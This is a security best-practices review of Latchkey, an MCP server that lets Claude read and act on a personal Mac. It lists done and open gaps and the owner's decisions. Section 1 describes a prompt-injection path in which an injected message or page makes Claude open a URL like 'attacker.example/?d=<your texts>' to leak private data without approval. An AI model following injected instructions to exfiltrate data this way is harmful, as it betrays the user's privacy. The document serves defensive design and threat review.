# Best practices for an app like Latchkey

Research done 2026-10-23. Latchkey is a remote MCP server that lets Claude act on a personal Mac:
read private data (notes, messages, files, screen), meet untrusted content (messages, web pages,
downloaded files), and act outward (send messages, run commands, browse). Each section lists what
the sources recommend, then where Latchkey stands: **done**, **gap**, or **later**.

## 1. The core risk: the "lethal trifecta"

**Guidance.** An agent that has (1) private data, (2) exposure to untrusted content, and (3) a way
to send data out can be tricked by text hidden in content into leaking that data. Models can't
reliably tell instructions from content, and filters aren't reliable ("95% is a failing grade in
web security"). The fix is architectural: break one leg, or make sure untrusted content can't
trigger consequential actions without a human. MCP makes this easy to fall into because one
connector can supply all three legs.
Sources: [Willison, the lethal trifecta](https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/);
[Design Patterns for Securing LLM Agents](https://arxiv.org/abs/2506.08837)
([summary](https://simonwillison.net/2025/Jun/13/prompt-injection-design-patterns/));
[CaMeL](https://arxiv.org/abs/2503.18813); [OWASP LLM Top 10 2026, Excessive Agency](https://www.invicti.com/blog/web-security/owasp-llm-top-10-2026-whats-new).

**Latchkey.** Has all three legs in one connector by design.
- **Done:** others' words are marked as "not instructions" in every result (spotlighting); a
  message can't fake the end of its quote.
- **Gap (most important):** Claude runs tools marked read-only without asking
  ([review criteria](https://claude.com/docs/connectors/building/review-criteria): "Read-only tools
  can run without per-call confirmation, and destructive tools always prompt"). `browser_open`,
  `browser_back`, and `browser_tabs` are marked read-only, but opening a URL sends data out
  (`https://attacker.example/?d=<your texts>`). So an injected message or page could make Claude
  read private data and leak it with no approval prompt. Opening pages should ask, or be limited.
- **Gap:** `messages_send` is marked not destructive. Sending to another person is irreversible
  and outward; OWASP's guidance is human approval for irreversible actions. Claude's built-in
  approvals (which Toni relies on, FR-115) only trigger on the hints, so the hints must be right.

## 2. Human approval and tool annotations

**Guidance.** Least agency, with human approval on irreversible actions (OWASP LLM03). Claude
decides per tool from the annotations: read-only runs freely, destructive always prompts, others
default to "Needs approval" for custom connectors and users can set "Always allow"
([Claude help](https://support.claude.com/en/articles/11176164)). Claude in Chrome adds per-site
permissions, confirmations before publishing, purchasing, or sharing personal data, blocked site
categories, and classifiers on content and on each action
([Claude in Chrome safety](https://support.claude.com/en/articles/12902428-using-claude-in-chrome-safely)).
ChatGPT agent pauses for logins and runs a "watch mode" on sensitive sites
([OpenAI](https://help.openai.com/en/articles/11752874)).

**Latchkey.**
- **Done:** every tool declares both hints; levels per capability; a capability that's off
  doesn't exist for Claude; notifications and an activity list on the Mac.
- **Gap:** hints to correct (above). Consider also `destructiveHint` on `computer_type`-like
  actions already set; `computer_open_app`, `computer_move`, `computer_scroll`, `files_move`,
  `files_copy`, `notes_create` are non-destructive and will still ask unless the user allows them.
- **Gap:** no sensitive-site rule for the browser (banking, government, health), unlike Claude in
  Chrome and ChatGPT agent.

## 3. MCP protocol and OAuth

**Guidance.** Tokens must be issued for this server (no token passthrough); per-client consent
showing the client's name and where the approval goes; exact redirect matching (loopback ports
may vary); CSRF protection and no framing of the consent page; SSRF protection when fetching
client metadata documents (block private addresses, beware DNS rebinding); state handles must
not authenticate; minimal scopes.
Sources: [MCP security best practices](https://modelcontextprotocol.io/specification/latest/basic/security_best_practices);
[MCP authorization](https://modelcontextprotocol.io/specification/latest/basic/authorization).

**Latchkey.**
- **Done:** own tokens, audience-checked; consent page with client name and redirect host, CSRF;
  PKCE S256; redirect checks; CIMD fetches refuse private, loopback, and link-local addresses at
  connect time (which also defeats DNS rebinding); shell job ids are only usable by the same
  account's Mac; refresh rotation with reuse detection; passkeys, no passwords.
- **Done (2026-10-23):** the Mac shows a notification each time a Claude client is given
  access (notice `client_authorized`). Was a gap: the owner wasn't told when a new Claude client
  was granted access. TeamViewer-style
  practice is to notify or require approval for each new connection
  ([TeamViewer](https://www.teamviewer.com/en/insights/unattended-access-security/)). A Mac
  notification "Claude (claude.ai) was given access to this Mac" on each new grant is cheap.
- **Done:** pages can't be framed (`frame-ancestors 'none'`, `X-Frame-Options: DENY`, checked
  on the hosted relay 2026-10-23).
- **Later:** finer scopes (per capability) would let a client be granted only part of the Mac;
  today levels on the Mac do this for all clients at once.

## 4. Trust in the relay (lessons from remote-access tools)

**Guidance.** A remote-access relay is a single point that can command every machine. AnyDesk's
2024 breach (production systems, code-signing keys) led to revoking certificates and passwords
([SecurityWeek](https://www.securityweek.com/anydesk-revokes-passwords-certificates-in-response-to-hack/)).
Practices: strong sign-in, per-connection approval, allowlists, session notifications, signed
updates, minimal server-side data.

**Latchkey.**
- **Done:** the Mac enforces levels itself (a compromised relay can't call a tool that's off);
  outbound-only connection; relay stores no tool content; 30-day metadata log; device key in the
  Secure Enclave; passkeys; Disconnect and levels on the Mac as a kill switch; self-hostable.
- **Gap:** a compromised relay can call any tool that is on. Options: keep powerful
  capabilities (Shell, Computer control) off by default (Toni chose all on, 2026-10-22), or
  require a fresh approval on the Mac for them. Worth a decision.
- **Later:** Developer ID signing, notarization, and signed Sparkle updates (EdDSA) before
  anyone else installs it.

## 5. Tool design (Anthropic's guidance)

**Guidance.** Few consolidated, high-impact tools rather than one per operation; clear prefixes;
human-readable values over IDs; a "concise/detailed" option; pagination and truncation with
sensible defaults (Claude Code caps a tool response at **25,000 tokens**); actionable errors;
descriptions that say what the tool does and never tell Claude how to behave; separate read and
write tools; evaluate with realistic multi-step tasks and real Claude.
Sources: [Writing effective tools for agents](https://www.anthropic.com/engineering/writing-tools-for-agents);
[Connector review criteria](https://claude.com/docs/connectors/building/review-criteria).

**Latchkey.**
- **Done:** prefixes per capability; read and write split; actionable errors; names resolved
  from Contacts; "read on with offset"; tested with real Claude Code against the real relay.
- **Done (2026-10-23):** pages are now 40,000 characters, and `notes_read` pages too. Was a
  gap: pages were up to 100,000 characters (about 25–30k tokens), at or over Claude Code's
  25k-token cap, so long notes, files, and pages can be cut off by Claude rather than by
  Latchkey. A 40,000-character page leaves room.
- **Gap:** 45 tools is a lot of context in every conversation (no maximum exists). Consolidation
  candidates: `computer_move/scroll/drag/click` into one action tool, as Claude's own computer-use
  tool does; `browser_back/tabs` into `browser_open`.
- **Gap:** no task evaluations. A small suite of realistic tasks ("add milk to my grocery note",
  "what did Sarah say about Saturday") run with real Claude would catch tool-design problems,
  as the live check did.
- **Gap:** an automated prompt-injection test: a planted message or page with instructions,
  checking that Claude doesn't act on it, run before releases.

## 6. The Mac app

**Guidance.** Developer ID signing, hardened runtime, notarization with stapled tickets
([Apple](https://developer.apple.com/documentation/security/notarizing-macos-software-before-distribution));
every nested binary (Sparkle) signed with the runtime; permissions requested in context with a
clear purpose ([HIG: accessing private data](https://developer.apple.com/design/human-interface-guidelines/patterns/accessing-private-data));
privileged helpers via `SMAppService` with the caller's code signature checked; containment where
possible (Windows runs MCP servers under a separate agent account in a separate session,
[Microsoft](https://learn.microsoft.com/en-us/windows/ai/mcp/servers/mcp-containment)).

**Latchkey.**
- **Done:** hardened runtime; helper checks the caller's signature; permissions asked in the
  setup window, one at a time, with the reason; never types passwords; tests can't touch the
  real pairing.
- **Later:** Developer ID, notarization, Sparkle keys (releases, decided as much later).
- **Note:** no macOS equivalent of Windows' agent account exists for an app that must read the
  owner's own data; levels and visibility are the practical containment.
- **Gap (privacy):** the local activity log keeps full arguments and results for 90 days,
  including message and note text. Keeping results shorter (or only metadata after a few days)
  lowers what a stolen or shared Mac exposes.

## 7. Open-source hygiene and operations

**Guidance (common practice).** A `SECURITY.md` with a private way to report vulnerabilities;
dependency updates and scanning; a privacy policy (required to be listed in Claude's directory
for local connectors and expected for remote ones); documented incident response.

**Latchkey.**
- **Gap:** no `SECURITY.md`, no dependency scanning (Dependabot or `govulncheck` in CI).
- **Later:** privacy policy and terms (with the directory listing).

## Decisions after this review (Toni, 2026-10-23)

- Opening pages in Safari stays automatic (gap 1 accepted).
- Sending messages unchanged: no Latchkey-side stop (gap 2 accepted).
- Notification on new access: built (gap 3).
- Page size: lowered to 40,000 characters (gap 4, Claude's call).
- Shell and Computer control stay on by default (gap 5 accepted).

## Summary of gaps, most important first

1. Read-only marking on `browser_open`/`back`/`tabs` lets data leave without approval.
2. `messages_send` should be marked destructive so Claude always asks.
3. Notify the owner when a new Claude client is granted access.
4. Page size above Claude Code's 25k-token cap; lower to about 40,000 characters.
5. Defaults for Shell and Computer control given relay compromise (decided all on; revisit?).
6. Sensitive-site rule for the browser (banking, government, health).
7. Prompt-injection test and task evaluations with real Claude.
8. Local activity log keeps full content for 90 days.
9. `SECURITY.md` and dependency scanning.
10. Fewer tools by consolidation.
